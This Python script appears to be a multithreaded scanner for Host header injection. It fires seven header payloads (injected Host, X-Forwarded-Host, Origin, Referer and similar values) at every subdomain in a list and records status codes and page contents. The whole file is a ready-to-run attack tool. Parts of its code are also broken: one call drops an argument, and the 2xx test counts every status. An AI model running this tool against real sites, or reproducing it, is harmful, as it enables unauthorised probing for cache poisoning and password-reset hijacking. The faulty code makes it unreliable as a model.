#!/usr/bin/python3

import requests, threading, time, sys
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from concurrent.futures import ThreadPoolExecutor, as_completed

def run():

	global status2xxList, status5xxList, reportList
	global perc, percShift, reportsCount

	threadsAmount = 30
	moreHeaders = False
	debug = False
	saveOutput = False

	status2xxList = []
	status5xxList = []
	reportList = []

	for i in range(1, len(sys.argv)):
		if sys.argv[i] == '-h' or sys.argv[i] == '--help':
			print("""\r\r
				Manual:
				\r-h --help - manual
				\r-f --filename - the name of the file with subdomains in the currrent directory
				\r-i -injection - the injection which will be used in payloads
				\r-d --debug - debug mode
				\r-mh --moreHeaders - if selected only the 6th payloads will be used
				\r-o --output - the file will be saved in the current directory with the specified name
				\r-t --threads - the amount of the concurrent threads (default set to 30)

				\rTypes of payloads:

				\rPayload 0:
				\rA clear payload without any injection just to probe the target

				\rPayload 1:
				\r{"Host":injection}

				\rPayload 2:
				\r{"Host":target+"@"+injection}

				\rPayload 3:
				\r{"Host":injection,"X-Forwarded-Host":target}

				\rPayload 4:
				\r{"Host":target, "X-Forwarded-Host":injection}

				\rPayload 5:
				\r{"Host":target, "X-Forwarded-Host":target+"@"+injection}

				\rPayload 6:
				\r{"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection,
				\r"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
				\r"Origin":injection}
				""")
			return
		if sys.argv[i] == '-d' or sys.argv[i] == '--debug':
			debug = True
		if sys.argv[i] == '-mh' or sys.argv[i] == '--moreHeaders':
			moreHeaders = True
		if sys.argv[i] == '-o' or sys.argv[i] == '--output':
			saveOutput = True
			outputName = sys.argv[i+1]
		if sys.argv[i] == '-t' or sys.argv[i] == '--threads':
			threadsAmount = int(sys.argv[i+1])
		if sys.argv[i] == '-f' or sys.argv[i] == '--filename':
			filename = sys.argv[i+1]
		if sys.argv[i] == '-i' or sys.argv[i] == '--injection':
			injection = sys.argv[i+1]

	file = open(filename,"r")
	subdomsList = file.readlines()
	file.close()

	subdomsList = [subdom.strip() for subdom in subdomsList]

	perc = 0
	reportsCount = 0
	targetsCount = len(subdomsList)*2
	percShift = 100 / targetsCount

	print('Starting...')
	runThreads(threadsAmount, subdomsList, injection, moreHeaders, debug)

	try:
		while reportsCount != targetsCount: # waiting for all the threads
			print(f"{reportsCount}/{targetsCount} targets are scanned. If you are stuck for too long, hit Ctrl+C", end="\r")
	except KeyboardInterrupt:
		if saveOutput:
			print("\nSaving and exiting...\n")
			saveTheResults(reportList, status2xxList, status5xxList, outputName)
		exit()


	print('\nScan is done! Saving the report...')

	if saveOutput:
		saveTheResults(reportList, status2xxList, status5xxList, outputName)

def saveTheResults(reportList, status2xxList, status5xxList, outputName):
	newFile = open(outputName, "w+", encoding='utf-8')
	written = 0

	for i in range(len(reportList)):
		newFile.write(str(reportList[i] + "\n"))
	written += 1

	newFile.write("\n\nSome interesting info for you:\n")
	newFile.write("Status 2xx targets:\n")
	status2xxList = list(set(status2xxList))
	for i in range(len(status2xxList)):
		newFile.write(str(status2xxList[i] + "\n"))
	written += 1

	newFile.write("\nStatus 5xx targets:\n")
	status5xxList = list(set(status5xxList))
	for i in range(len(status5xxList)):
		newFile.write(str(status5xxList[i] + "\n"))
	written += 1

	if written == 3:
		print("Saved!")

	newFile.close()


def runThreads(threadsAmount, targetsList, injection, moreHeaders, debug):

	processes = []
	with ThreadPoolExecutor(max_workers=threadsAmount) as executor:
		for target in targetsList:
			processes.append(executor.submit(processTheTarget, target, "https://", injection, moreHeaders, debug))
			processes.append(executor.submit(processTheTarget, target, "http://", injection, moreHeaders, debug))

def processTheTarget(target, protocol, injection, moreHeaders, debug):

	global perc, percShift, reportsCount
	if (round(perc + percShift, 3) < 100):
		perc += percShift
		print(f'{round(perc, 3)}%', end="\r")


	retry_strategy = Retry(total=2, backoff_factor=1)
	adapter = HTTPAdapter(max_retries=retry_strategy)
	session = requests.Session()
	session.mount("https://", adapter)
	session.mount("http://", adapter)

	if moreHeaders:
		report = f"Target: {protocol+target}, data:\n"
		r = getResponse(session, target, protocol, "head", 6, injection, debug)

		if type(r) != str:
			report += str(r.status_code)
		elif type(r) == str:
			report += "something went wrong..."

		report += "\n"+("-"*100)+"\n"
		reportList.append(report)
		reportsCount += 1


	if not moreHeaders:
		report = f"Target: {protocol+target}, data:\n"

		for i in range(6):

			r = getResponse(session, target, protocol, "head", i, injection, debug)
			print()

			if type(r) != str: # it means that there is no error
				#response = f"\nPayload number: {i}\n\nStatus code: {r.status_code}\n\nResponse headers: {r.headers}\n"
				response = f"\nPayload number: {i}\n\nStatus code: {r.status_code}\n\n"
				report += response

				if r.status_code == 200:
					response = getResponse(target, protocol, "get", i, injection, debug)
					report += "\n"+response+"\n"

			if type(r) == str: # it means that there is an error, because request object must be returned
			    report += "\n"+r+"\n"

			    if "Name or service not known" in str(r):
			    	report += "\n\nDomain name resolution probe failed. No payloads were sent"
			    	break


		report += "\n"+("-"*100)+"\n"
		reportList.append(report)
		reportsCount += 1


def getResponse(session, target, protocol, method, payloadNum, injection, debug):
	payloadsList = []
	payloadsList.append({}) #0
	payloadsList.append({"Host":injection}) #1
	payloadsList.append({"Host":target+"@"+injection}) #2
	payloadsList.append({"Host":injection,"X-Forwarded-Host":target}) #3
	payloadsList.append({"Host":target, "X-Forwarded-Host":injection}) #4
	payloadsList.append({"Host":target, "X-Forwarded-Host":target+"@"+injection}) #5
	payloadsList.append({"Host":injection, "Cache-Control":"no-transform", "User-Agent":injection, #6
			"Referer":injection, "X-Forwarded-Host":injection, "X-Forwarded-For": injection,
			"Origin":injection})

	if method == "head":

		try:	
			r = session.head(protocol+target, headers=payloadsList[payloadNum], timeout=2)
			if r.status_code >= 200: status2xxList.append(target)
			if r.status_code >= 500: status5xxList.append(target)

			if debug: print(target, payloadsList[payloadNum], r)
			return r
		except Exception as exception:
			response = f"Error {exception}, using payload: {payloadsList[payloadNum]}"
			if debug: print(response+" on "+target)
			return response

	if method == "get":
		try:
			r = session.get(protocol+target, headers=payloadsList[payloadNum], timeout=5)
			if debug: print(target, payloadsList[payloadNum], r)

			response = f"Content of the page {target}:\n\n{r.text}\n"
			return response
		except Exception as exception:
			response = f"Error {exception}, making a GET request, using payload: {payloadsList[payloadNum]}"
			if debug: print(response+"on "+target)
			return response 

run()
